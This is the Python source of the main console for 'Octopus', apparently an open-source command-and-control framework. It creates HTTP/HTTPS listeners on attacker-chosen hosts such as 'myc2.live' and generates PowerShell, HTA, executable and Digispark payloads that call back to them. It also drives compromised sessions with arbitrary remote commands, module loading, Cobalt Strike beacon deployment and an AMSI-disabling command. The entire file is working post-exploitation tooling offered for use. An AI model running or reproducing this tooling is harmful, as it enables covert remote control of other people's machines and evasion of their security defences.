#!/usr/bin/python

import threading
import readline
import time
import base64
import sys
import os
import signal
from termcolor import colored
from core.functions import *
from core.weblistener import *
from flask import *
from profile import *
import logging

python_version = sys.version_info[0]

if python_version != 3:
    print(colored("[-] Unable to run Octopus", "red"))
    print(colored("[-] Please run Octopus with python 3", "red"))
    sys.exit()


listeners=NewListener()
def ctrlc(sig, frame):
    pass

signal.signal(signal.SIGINT, ctrlc)
if not os.path.isfile(".oct_history"):
    open('.oct_history', 'a').close()
else:
    readline.read_history_file(".oct_history")

banner()

while True:

    readline.set_completer(completer)
    readline.parse_and_bind("tab: complete")
    readline.write_history_file(".oct_history")
    try:
        command = input("\033[4mOctopus\033[0m"+colored(" >>", "green"))
        # readline.write_history_file(".console_history.oct")
        if command == "list":
            list_sessions()

        if command == "history":
                get_history()

        if command == "help":
            main_help_banner()


        if command == "listeners":
            list_listeners()

        if command.split(" ")[0] == "delete":
            try:
                session = connections_information[int(command.split(" ")[1])]
                delete(session[2], int(command.split(" ")[1]))
            except:
                print(colored("[-] Wrong listener selected !", "red"))
                continue


        if command == "clear":
            os.system("clear")

        if command == "exit":
            exit()

        if command.split(" ")[0] == "generate_powershell":
            try:
                listener = command.split(" ")[1]
            except IndexError:
                print(colored("[-] Please select a listener !", "red"))
                print(colored("Syntax :  generate_powershell listener_name", "green"))
                print(colored("Example : generate_powershell listener1", "yellow"))
                continue

            try:
                hostname = listeners_information[listener][3]+":"+str(listeners_information[listener][2])
                interval = listeners_information[listener][4]
                path = listeners_information[listener][5]
                proto = listeners_information[listener][6]

                # check if protocol is True then https is used
                if proto:
                    proto_to_use = "https"
                else:
                    proto_to_use = "http"

                generate(hostname, path, proto_to_use, interval)
            except KeyError:
                print(colored("[-] Wrong listener selected !", "red"))
                continue

        if command.split(" ")[0] == "delete_listener":
            try:
                try:
                    listener = command.split(" ")[1]
                    delete_listener(listener)
                except IndexError:
                    print(colored("[-] Please select a listener !", "red"))
                    print(colored("Syntax :  delete_listener listener_name", "green"))
                    print(colored("Example : delete_listener listener1", "yellow"))

            except:
                print(colored("[-] Wrong listener selected !", "red"))
                continue


        if command.split(" ")[0] == "generate_hta":
            try:
                listener = command.split(" ")[1]
            except IndexError:
                print(colored("[-] Please select a listener !", "red"))
                print(colored("Syntax :  generate_hta listener_name", "green"))
                print(colored("Example : generate_hta listener1", "yellow"))
                continue

            try:
                host_ip = listeners_information[listener][3]
                bind_port=listeners_information[listener][2]
                path = listeners_information[listener][5]
                proto = listeners_information[listener][6]

                # check if protocol is True then https is used
                if proto:
                    proto_to_use = "https"
                else:
                    proto_to_use = "http"
                listeners.create_hta()
                generate_hta(host_ip,bind_port,proto_to_use)
            except KeyError:
                print(colored("[-] Wrong listener selected !", "red"))
                continue

        if command.split(" ")[0] == "generate_unmanaged_exe":
            try:
                listener = command.split(" ")[1]
                exe_path = command.split(" ")[2]
            except IndexError:
                print(colored("[-] Please select a listener and check your options !", "red"))
                print(colored("Syntax :  generate_unmanaged_exe listener_name output_path", "green"))
                print(colored("Example : generate_unmanaged_exe listener1 /opt/Octopus/file.exe", "yellow"))
                continue

            try:
                hostname = listeners_information[listener][3]+":"+str(listeners_information[listener][2])
                path = listeners_information[listener][5]
                proto = listeners_information[listener][6]

                # check if protocol is True then https is used
                if proto:
                    proto_to_use = "https"
                else:
                    proto_to_use = "http"

                generate_exe_powershell_downloader(hostname, path, proto_to_use, exe_path)
            except KeyError:
                print(colored("[-] Wrong listener selected !", "red"))
                continue

# generate_digispark
        if command.split(" ")[0] == "generate_digispark":
            try:
                listener = command.split(" ")[1]
                ino_path = command.split(" ")[2]
            except IndexError:
                print(colored("[-] Please select a listener and check your options !", "red"))
                print(colored("Syntax :  generate_digispark listener_name output_path", "green"))
                print(colored("Example : generate_digispark listener1 /opt/Octopus/file.ino", "yellow"))
                continue

            try:
                hostname = listeners_information[listener][3]+":"+str(listeners_information[listener][2])
                path = listeners_information[listener][5]
                proto = listeners_information[listener][6]

                # check if protocol is True then https is used
                if proto:
                    proto_to_use = "https"
                else:
                    proto_to_use = "http"

                generate_digispark(hostname, path, proto_to_use, ino_path)
            except KeyError:
                print(colored("[-] Wrong listener selected !", "red"))
                continue


        if command.split(" ")[0] == "interact":
                readline.set_completer(completer_interact)
                readline.parse_and_bind("tab: complete")

                try:
                    session = connections_information[int(command.split(" ")[1])]
                except:
                    print(colored("[-] Error interacting with host", "red"))
                    continue
                while True:
                    try:
                        scommand = input("(%s) >> " % colored(session[2], "red"))
                        if scommand == "":
                            continue
                        elif scommand == "exit" or scommand == "back":
                            break
                        elif scommand == "help":
                            interact_help()
                        elif scommand == "clear":
                            os.system("clear")

                        elif scommand == "modules":
                            list_modules()
                            pass
                        elif scommand.split(" ")[0] == "load":
                            try:
                                module_name = scommand.split(" ")[1]
                                load_module(session[2], module_name)
                                pass
                            except IndexError:
                                print(colored("[+] Please select a module !"))

                        elif scommand.split(" ")[0] == "deploy_cobalt_beacon":
                            try:
                                beacon_path = scommand.split(" ")[1]
                                deploy_cobalt_beacon(session[2], beacon_path)
                                pass
                            except IndexError:
                                print(colored("[+] Please select a valid beacon path!", "red"))

                        elif scommand == "disable_amsi":
                            disable_amsi(session[2])
                            pass
                        else:
                            send_command(session[2], scommand)
                    except:
                        print(" ")

        elif command.split(" ")[0] == "listen_http":
            try:
                # create new listeners for
                ip = command.split(" ")[1]
                try:
                    port = int(command.split(" ")[2])
                except ValueError:
                    print(colored("[-] port should be number !", "red"))
                    continue
                host = command.split(" ")[3]
                try:
                    interval = int(command.split(" ")[4])
                except ValueError:
                    print(colored("[-] interval should be number !", "red"))
                    continue
                path = command.split(" ")[5]
                listener_name = command.split(" ")[6]
                if check_listener_name(listener_name):
                        if check_url(path):
                            listener = NewListener(
                                listener_name,
                                ip,
                                port,
                                host,
                                interval,
                                path
                                )
                            if check_listener_port(ip, port):
                                listener.start_listener()
                                listener.create_path()
                                listeners=listener
                                print(colored("[+]%s Listener has been created" % listener_name, "green"))
                            #else:
                            #    print(colored("[-] Cannot use the same hostname for multiple urls", "red"))
                                    #in order to make it global so we can use in other functions

                            else:
                                print(colored("[+] Port in use or you don't have permession to bind", "red"))
                        else:
                            print(colored("[-] URL name already used, please change it", "red"))
                else:
                    print(colored("[-] Listener name already used, please change it", "red"))

            except IndexError:
                print(colored("[-] Please check listener arguments !", "red"))
                print(colored("Syntax  : listen_http BindIP BindPort hostname interval URL listener_name", "green"))
                print(colored("Example (with domain) : listen_http 0.0.0.0 8080 myc2.live 5 comments.php op1_listener", "yellow"))
                print(colored("Example (without domain) : listen_http 0.0.0.0 8080 172.0.1.3 5 profile.php op1_listener", "yellow"))
                http_help_banner()

                continue

        elif command.split(" ")[0] == "listen_https":
            try:
                # create new listeners for
                ip = command.split(" ")[1]
                try:
                    port = int(command.split(" ")[2])
                except ValueError:
                    print(colored("[-] port should be number !", "red"))
                    continue
                host = command.split(" ")[3]
                try:
                    interval = int(command.split(" ")[4])
                except ValueError:
                    print(colored("[-] interval should be number !", "red"))
                    continue
                path = command.split(" ")[5]
                listener_name = command.split(" ")[6]
                if check_listener_name(listener_name):
                        key_path = command.split(" ")[7]
                        cert_path = command.split(" ")[8]
                        if not os.path.isfile(cert_path) or not os.path.isfile(key_path):
                            print(colored("[-] Please check the certficate and key path", "red"))
                        else:
                            listener = NewListener(
                                listener_name,
                                ip,
                                port,
                                host,
                                interval,
                                path,
                                cert_path,
                                key_path
                            )
                            if check_listener_port(ip, port):
                                listener.start_listener()
                                listener.create_path()
                                listeners=listener
                                print(colored("[+]%s Listener has been created" % listener_name, "green"))
                            else:
                                print(colored("[+] Port in use or you don't have permession to bind", "red"))
                else:
                        print(colored("[-] Listener name already used, please change it", "red"))
            except IndexError:
                print(colored("[-] Please check listener arguments !", "red"))
                print(colored("Syntax  : listen_https BindIP BindPort hostname interval URL listener_name certficate_path key_path", "green"))
                print(colored("Example (with domain) : listen_https 0.0.0.0 443 myc2.live 5 login.php op1_listener certs/cert.pem certs/key.pem", "yellow"))
                continue
    except EOFError:
        print(" ")
